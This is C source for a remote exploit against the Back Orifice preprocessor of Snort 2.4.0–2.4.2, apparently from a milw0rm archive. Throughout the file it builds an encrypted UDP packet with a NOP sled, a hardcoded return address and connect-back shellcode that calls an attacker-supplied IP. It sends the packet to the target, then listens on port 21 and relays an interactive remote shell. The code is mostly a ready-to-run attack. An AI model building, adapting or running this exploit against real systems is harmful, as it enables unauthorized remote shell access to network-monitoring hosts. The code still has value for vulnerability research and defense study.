/*
 * snort 2.4.0 - 2.4.2 Back Orifice Pre-Preprocessor Remote Exploit
 *  
 *              by Russell Sanford (xort@tty64.org)
 *                  -> www.code-junkies.net <-
 *
 *        Date: Nov 11, 2005
 *
 * Discription: A buffer overflow exist in the snort pre-preprocessor
 *		designed to detect encrypted Back Orifice ping packets
 *		on a network. The overflow occurs as a result of a field 
 *	 	size read directly from the data within that packet
 *	 	inwhich	an attacker can specify.
 *
 *	Credit: ISS XFORCE (great work as always)
 *
 * Information: CERT TA05-291A
 *
 *     Respect: Pull The Plug & DARPA Net Communities
 *
 */

#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <errno.h>
#include <string.h>
#include <time.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <signal.h>

#define buffsize 1056
#define COOKIE   "*!*QWTY?"

typedef struct {
	char   magic[8];
	int         len;
	int          id;
	char       type;
	char data[buffsize];
	char        crc;
} BOHEADER;

char        buffer[buffsize+5000];
static long              holdrand = 31337L;
unsigned int          ret_address = 0xbfffebad;

// 90 byte Connect Back shellcode. Connects Back to Port 21 to givin IP
char shellcode[] =
"\x31\xc0\x6a\x01\x5b\x50\x53\x6a\x02\x89\xe1\xb0\x66\xcd\x80\x5b\x43\x5f\x68"
"\x45\xc4\x34\x1e" // IP-A
"\x81\x04\x24"
"\x01\x01\x01\x01" // IP-B 
"\x68\x01\xff\xfe\x13\x81\x04\x24\x01\x01\x01\x01\x6a\x10\x51\x50\x89\xe1\xb0"
"\x66\xcd\x80\x5b\x31\xc9\x6a\x3f\x58\xcd\x80\x41\x80\xf9\x03\x75\xf5\x31\xc0"
"\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0"
"\x0b\xcd\x80\xeb\xfe";

int mrand (void) {
       	return(((holdrand = holdrand * 214013L + 2531011L) >> 16) & 0x7fff);
}

void timeout(int sig_num) { 
	printf(" [-] Listen() for connect back shellcode timed out. Exploit Failed!\n");
	exit(1);
}

int main(int argc, char **argv) {

	signal(SIGALRM,timeout);	

	int s, z, i, len_inet, IP_a, IP_b, l, sent;
	char *server_addr=argv[1];
	char  *local_addr=argv[2];
	char     buf[512];
	struct sockaddr_in adr_srvr, adr, loc_adr;
        fd_set  rfds, wfds;

	printf("\n\t,------------------------------------------------------------,\n"
	         "\t| Snort 2.4.0-2.4.2 Back Orifice Preprocessor Remote Exploit |\n"
	         "\t|           by Russell Sanford - xort@tty64.org              |\n"
	         "\t`------------------------------------------------------------`\n\n");

	/* 
	 * Check for Valid Input
	 */
	
	if (argc < 3) {
		printf("usage: ./snortxp TARGET-IP CONNECT-BACK-IP\n\n");
		
		exit(1);
	}	

	/*
	 * Fix up Safe Values for connect back shellcode 
	 */
	
	IP_a = inet_addr(argv[2]);
	IP_b = 0;

	printf(" [x] Patching Shellcode to Connect back to %s.\n",argv[2]);

	do {
		IP_a -= 0x01010101;	IP_b += 0x01010101;
	}
	while (  ((IP_a & 0x000000ff) == 0) || 
                 ((IP_a & 0x0000ff00) == 0) || 
		 ((IP_a & 0x00ff0000) == 0) ||
		 ((IP_a & 0xff000000) == 0) );

	*(int *)&shellcode[19] = IP_a;
	*(int *)&shellcode[26] = IP_b;

	/*
	 * Create And Fill In Header Info
	 */

	printf(" [x] Creating Evil Packet.\n");

	BOHEADER evil_packet;

	memcpy(evil_packet.magic,COOKIE,8); 
	evil_packet.len  =  (buffsize+38); //1094
	evil_packet.id   = 0xbadc0ded;
        memset(evil_packet.data, 0x90, buffsize);
	memcpy(&evil_packet.data[buffsize-300],shellcode,90);
	evil_packet.type = 0x1;
	evil_packet.crc  = 0x43;

	printf(" [x] Using Return Address: 0x%.8x.\n",ret_address);

	*(int *)&evil_packet.data[buffsize-4] = ret_address;

	/*
	 * Encrypt Evil Packet
	 */

	printf(" [x] Encrypting Packet.\n");

	memcpy(buffer,&evil_packet,(18+buffsize));
	for(i=0; i < (18+buffsize); i++) { buffer[i] = buffer[i] ^ (mrand()%256); }

	/*
	 * Set Up Socket To Send UDP Packet 
	 */

	printf(" [x] Preparing to Send Evil UDP Packet to %s.\n",argv[1]);
		
	memset(&adr_srvr,0,sizeof adr_srvr);
	adr_srvr.sin_family = AF_INET;
	adr_srvr.sin_port = htons(9000);
	adr_srvr.sin_addr.s_addr = inet_addr(server_addr);
	len_inet = sizeof adr_srvr;

	s = socket(AF_INET,SOCK_DGRAM,0);
	
	if ( s == -1 ) {
		printf(" [-] Failed to Create Socket. Exiting...\n");
		exit(1);
	}

	/* 
	 * Send Packet
	 */

	printf(" [x] Sending Packet.\n");

	z = sendto(s,buffer,(18+buffsize),0,(struct sockaddr *)&adr_srvr, len_inet);

	if ( z == -1 ) {
		printf(" [-] Failed to Send Packet. Exiting...\n");
		exit(1);
	}

	/*
	 * Listen For Connect Back Shellcode
	 */
	 
	 printf(" [x] Listening for Connect Back Shellcode.\n");

 	 s = socket(AF_INET,SOCK_STREAM,0);

 	 if ( s == -1 ) {
		printf(" [-] Failed to Create Socket. Exiting...\n");
		exit(1);
	 }

	 memset(&adr,0,sizeof adr);
	 adr.sin_family = AF_INET;
	 adr.sin_port = htons(21);
	 adr.sin_addr.s_addr = INADDR_ANY;

	 z = bind(s,(struct sockaddr *)&adr,sizeof(struct sockaddr));
	
	 if ( z == -1 ) {
		printf(" [-] Failed to Bind Socket. Exiting...\n");
		exit(1);
	 }

	 alarm(30);	// Set alarm so code can time out
	 listen(s,4);

	 int sin_size = sizeof(struct sockaddr_in);
	 int new_fd = accept(s, (struct sockaddr *)&loc_adr,&sin_size);

    	 alarm(0);	

	 if (new_fd == -1 ) {
		 printf(" [-] Failed to Accept Connection. Exiting...\n");
		 exit(1);
	 }

	 printf(" [x] Connection Established! Exploit Successful.\n\n");

         write(new_fd,"uname -a\nid\n",12);

	 /*
	  * Establish Connection. (ripped)
	  */

         while (1) {
                FD_SET (0, &rfds);
                FD_SET (new_fd, &rfds);
                FD_SET (new_fd, &wfds);

                select (new_fd + 1, &rfds, NULL, NULL, NULL);

                if (FD_ISSET (0, &rfds)) {
                        l = read (0, buf, sizeof (buf));
                        if (l <= 0) {
                                exit (EXIT_FAILURE);
                        }
                        sent=0;
                        while (!sent) {
                                select (new_fd+1, NULL, &wfds, NULL, NULL);
                                if (FD_ISSET(new_fd, &wfds)) {
                                        write(new_fd, buf, l);
                                        sent=1;
                                }
                        }
                }

                if (FD_ISSET (new_fd, &rfds)) {
                        l = read (new_fd, buf, sizeof (buf));
                        if (l == 0) {
                                fprintf(stdout,"\n [x] Connection Closed By Remote Host.\n");
                                exit (EXIT_FAILURE);
                        } else if (l < 0) {
                                exit (EXIT_FAILURE);
                        }
                        write (1, buf, l);
                }
        }

	return 0;
}

// milw0rm.com [2005-11-11]